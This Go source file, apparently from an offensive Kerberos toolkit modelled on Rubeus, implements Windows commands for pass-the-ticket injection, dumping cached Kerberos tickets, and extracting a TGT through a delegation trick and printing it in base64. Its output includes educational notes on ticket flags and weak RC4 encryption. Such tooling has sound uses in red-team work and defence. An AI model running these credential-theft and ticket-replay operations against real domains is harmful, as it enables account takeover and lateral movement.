//go:build windows
// +build windows

package main

import (
	"fmt"
	"strings"
	"time"

	"github.com/goobeus/goobeus/pkg/ticket"
	"github.com/goobeus/goobeus/pkg/windows"
)

// cmdPTT handles pass-the-ticket on Windows.
func cmdPTT(args []string) error {
	ticketPath := flags.ticket
	if len(args) > 0 {
		ticketPath = args[0]
	}
	if ticketPath == "" {
		return fmt.Errorf("ticket required (-t or as argument)")
	}

	kirbi, err := ticket.LoadKirbi(ticketPath)
	if err != nil {
		return fmt.Errorf("failed to load ticket: %w", err)
	}

	if err := windows.PassTheTicket(kirbi); err != nil {
		return fmt.Errorf("PTT failed: %w", err)
	}

	fmt.Println("[+] Ticket injected successfully")
	return nil
}

// cmdDump handles ticket dumping on Windows.
func cmdDump(args []string) error {
	cache, err := windows.TriageTickets()
	if err != nil {
		return fmt.Errorf("failed to triage tickets: %w", err)
	}

	if len(cache.Tickets) == 0 {
		fmt.Println("[*] No tickets found in cache")
		return nil
	}

	fmt.Printf("[+] Found %d cached Kerberos tickets:\n\n", len(cache.Tickets))

	for i, tkt := range cache.Tickets {
		// Determine ticket type
		ticketType := "Service Ticket"
		if isKrbtgt(tkt.ServerName) {
			ticketType = "TGT (Ticket Granting Ticket)"
		}

		fmt.Printf("═══════════════════════════════════════════════════════════════\n")
		fmt.Printf("  Ticket #%d: %s\n", i+1, ticketType)
		fmt.Printf("═══════════════════════════════════════════════════════════════\n")
		fmt.Printf("  Server:     %s @ %s\n", tkt.ServerName, tkt.RealmName)
		fmt.Printf("  Encryption: %s\n", describeEtype(tkt.EncryptionType))
		fmt.Printf("  Flags:      0x%08x\n", tkt.TicketFlags)
		fmt.Printf("              %s\n", describeFlagsDetailed(tkt.TicketFlags))

		// Convert FILETIME to readable times
		if tkt.StartTime != 0 {
			fmt.Printf("  Start Time: %s\n", filetimeToString(tkt.StartTime))
		}
		if tkt.EndTime != 0 {
			fmt.Printf("  End Time:   %s\n", filetimeToString(tkt.EndTime))
			remaining := filetimeToTime(tkt.EndTime).Sub(time.Now())
			if remaining > 0 {
				fmt.Printf("              ⏱️  %s remaining\n", formatDuration(remaining))
			} else {
				fmt.Printf("              ⚠️  EXPIRED\n")
			}
		}
		if tkt.RenewTime != 0 {
			fmt.Printf("  Renew Till: %s\n", filetimeToString(tkt.RenewTime))
		}

		// Educational notes based on flags
		printFlagEducation(tkt.TicketFlags)
		fmt.Println()
	}

	// Summary
	fmt.Println("───────────────────────────────────────────────────────────────")
	fmt.Println("EDUCATIONAL NOTES:")
	fmt.Println("  • TGT = Used to request service tickets from KDC")
	fmt.Println("  • Forwardable = Can be delegated to other servers")
	fmt.Println("  • Renewable = Can extend lifetime without re-auth")
	fmt.Println("  • Pre-authent = User proved identity with password/key")
	fmt.Println("───────────────────────────────────────────────────────────────")

	return nil
}

func isKrbtgt(serverName string) bool {
	return len(serverName) >= 6 && serverName[:6] == "krbtgt"
}

func describeEtype(etype int32) string {
	switch etype {
	case 17:
		return "AES-128-CTS-HMAC-SHA1-96 (aes128-cts)"
	case 18:
		return "AES-256-CTS-HMAC-SHA1-96 (aes256-cts) ✓ Strong"
	case 23:
		return "RC4-HMAC (arcfour) ⚠️ Weak - Crackable"
	case 24:
		return "RC4-HMAC-EXP (arcfour-exp) ⚠️ Export Weak"
	default:
		return fmt.Sprintf("Unknown (%d)", etype)
	}
}

func describeFlagsDetailed(flags uint32) string {
	var parts []string

	if flags&0x40000000 != 0 {
		parts = append(parts, "forwardable")
	}
	if flags&0x20000000 != 0 {
		parts = append(parts, "forwarded")
	}
	if flags&0x10000000 != 0 {
		parts = append(parts, "proxiable")
	}
	if flags&0x08000000 != 0 {
		parts = append(parts, "proxy")
	}
	if flags&0x04000000 != 0 {
		parts = append(parts, "may-postdate")
	}
	if flags&0x02000000 != 0 {
		parts = append(parts, "postdated")
	}
	if flags&0x01000000 != 0 {
		parts = append(parts, "invalid")
	}
	if flags&0x00800000 != 0 {
		parts = append(parts, "renewable")
	}
	if flags&0x00400000 != 0 {
		parts = append(parts, "initial")
	}
	if flags&0x00200000 != 0 {
		parts = append(parts, "pre_authent")
	}
	if flags&0x00100000 != 0 {
		parts = append(parts, "hw_authent")
	}
	if flags&0x00080000 != 0 {
		parts = append(parts, "transited-policy-checked")
	}
	if flags&0x00040000 != 0 {
		parts = append(parts, "ok-as-delegate")
	}
	if flags&0x00010000 != 0 {
		parts = append(parts, "name-canonicalize")
	}

	if len(parts) == 0 {
		return "(none)"
	}
	return strings.Join(parts, " ")
}

func printFlagEducation(flags uint32) {
	// Highlight security-relevant flags
	if flags&0x00040000 != 0 {
		fmt.Println("              💡 ok-as-delegate: Server can impersonate you!")
	}
	if flags&0x20000000 != 0 {
		fmt.Println("              💡 forwarded: This is a delegated credential")
	}
	if flags&0x00400000 != 0 {
		fmt.Println("              💡 initial: Primary TGT from authentication")
	}
}

func filetimeToTime(ft int64) time.Time {
	// FILETIME is 100ns intervals since Jan 1, 1601
	// Convert to Unix time (seconds since Jan 1, 1970)
	const epochDiff = 116444736000000000 // 100ns intervals between 1601 and 1970
	return time.Unix(0, (ft-epochDiff)*100)
}

func filetimeToString(ft int64) string {
	t := filetimeToTime(ft)
	return t.Format("2006-01-02 15:04:05 MST")
}

func formatDuration(d time.Duration) string {
	hours := int(d.Hours())
	minutes := int(d.Minutes()) % 60
	if hours > 24 {
		days := hours / 24
		hours = hours % 24
		return fmt.Sprintf("%dd %dh %dm", days, hours, minutes)
	}
	return fmt.Sprintf("%dh %dm", hours, minutes)
}

// cmdTGTDeleg handles TGT extraction via delegation on Windows.
func cmdTGTDeleg(args []string) error {
	result, err := windows.ExtractTGTDeleg()
	if err != nil {
		return fmt.Errorf("tgtdeleg failed: %w", err)
	}

	fmt.Println("[+] TGT extracted successfully via delegation trick")

	if flags.outfile != "" {
		if err := ticket.SaveKirbi(result.TGT, flags.outfile); err != nil {
			return fmt.Errorf("failed to save ticket: %w", err)
		}
		fmt.Printf("[+] Saved to %s\n", flags.outfile)
	} else {
		fmt.Printf("\n%s\n", result.Base64)
	}

	return nil
}
